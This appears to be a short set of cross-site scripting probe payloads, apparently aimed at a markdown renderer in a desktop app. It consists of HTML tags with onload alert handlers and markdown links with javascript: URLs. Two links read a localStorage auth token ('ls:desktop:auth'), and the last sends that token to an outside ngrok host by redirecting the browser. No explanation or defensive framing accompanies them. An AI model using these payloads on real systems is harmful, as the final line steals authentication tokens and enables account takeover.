...
<details onload=alert(999)>aaaaaa</details>+

<div onload=alert(8888)>test_div</div>

[test1234](javascript:alert(localStorage.getItem('ls:desktop:auth')))
[ttt](javascript:alert(222))
[get it](javascript:window.location.replace('https://8b68-176-228-153-49.ngrok-free.app/?x='+localStorage.getItem('ls:desktop:auth')));  
